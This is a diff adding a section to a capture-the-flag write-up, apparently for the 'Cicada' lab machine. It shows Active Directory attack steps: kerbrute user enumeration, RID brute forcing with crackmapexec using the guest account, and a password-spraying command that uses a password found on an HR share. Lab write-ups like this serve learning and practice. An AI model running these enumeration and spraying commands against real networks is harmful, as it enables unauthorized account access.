@@ -120,3 +120,25 @@ Ouput Showed the usual windows shares but HR and DEV were interesting so i start
 i had access to HR through a NULL session, after connecting to it i find one file "Notice from HR.txt"  
 Inside this i found a password "Cicada$M6Corpb*@Lp#nZp!8"
 
+From Here i wasnt too sure what i could do since i had no usernames, so finding some usernames was my next goal  
+so i tried using kerbrute using some seclists wordlists  
+
+**kerbrute userenum --dc $ip -d cicada.htb <wordlist>**
+this returned me nothing other then "administrator" and "guest" which i already knew
+
+so i went to my notes on attacking AD and decided to try RID Brute Forcing with crackmapexec  
+**crackmapexec smb $ip -u "guest" -p "" --rid-brute**
+
+        [...snip]
+        SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+        SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+        SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+        SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+        SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+        SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+        [...snip]
+and finally i had a list of usernames i could use  
+now i can try some password spraying  
+
+**crackmapexec smb $ip -u users.txt -p 'Cicada$M6Corpb\*@Lp#nZp!8' --continue-on-success**
+
